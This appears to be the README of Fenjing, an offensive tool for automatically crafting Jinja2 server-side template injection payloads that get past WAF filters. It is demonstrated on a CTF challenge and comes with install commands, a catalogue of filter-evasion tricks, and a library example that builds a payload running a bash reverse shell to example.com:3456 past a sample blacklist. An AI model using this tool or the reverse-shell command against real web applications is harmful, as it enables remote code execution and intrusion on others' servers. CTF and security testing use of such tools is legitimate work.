![焚靖](assets/fenjing.webp)

> Bypass the WAF without knowing WAF

焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能

## 演示

![CTFShow web365](assets/demo.webp)

`python -m fenjing crack --inputs name --method GET --url 'http://xxx/'`

## 快速上手

在以下方法中选择一种

`url`是表单所在的URL, `method`是提交表单的HTTP方法, `inputs`是表单的所有字段，以逗号分隔

### 下载并运行docker镜像

```shell
docker pull marven11/fenjing
docker run marven11/fenjing crack --inputs name --method GET --url 'http://xxx/'
```

### 手动安装

```shell
git clone https://github.com/Marven11/Fenjing
cd Fenjing
python -m pip install -r requirements.txt
python -m fenjing crack --inputs name --method GET --url 'http://xxx/'
```

### 手动构建Docker镜像

```shell
docker build -t fenjing .
docker run -it --net host fenjing crack --inputs name --method GET --url 'http://xxx/'
```

## 特性

支持绕过：

- `'`和`"`
- 绝大多数敏感关键字
- 任意阿拉伯数字
- `_`
- `[`
- `+`
- `-`
- `~`
- `{{`

### 自然数绕过：

支持绕过0-9的同时绕过加号或减号

支持全角数字和特定数字相加减两种绕过方式

### `'%c'`绕过:

支持绕过引号，`g`和`lipsum`

### 下划线绕过：

支持`(lipsum|escape|batch(22)|list|first|last)`
- 其中的数字22支持上面的数字绕过

### 任意字符串：

支持绕过引号，任意字符串拼接符号，下划线和任意关键词

支持以下形式

- `'str'`
- `"str"`
- `"\x61\x61\x61"`
- `dict(__class__=cycler)|join`
    - 其中的下划线支持绕过
- `'%c'*3%(97,97, 97)`
    - 其中的`'%c'`也支持上面的`'%c'`绕过
    - 其中的所有数字都支持上面的数字绕过

### 属性：

- `['aaa']`
    - 其中的字符串支持上面的任意字符串绕过
- `.aaa`
- `|attr('aaa')`
    - 其中的字符串也支持上面的任意字符串绕过

### Item

- `['aaa']`
    - 其中的字符串支持上面的任意字符串绕过
- `.aaa`
- `.__getitem__('aaa')`
    - 其中的`__getitem__`支持上面的属性绕过
    - 其中的字符串也支持上面的任意字符串绕过


### 作为库使用

参考[example.py](fenjing/example.py)

```python
from fenjing import exec_cmd_payload

import functools
import time
import logging

logging.basicConfig(level = logging.WARNING)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]

    for word in blacklist:
        if word in s:
            return False
    return True

payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")

print(payload)

```

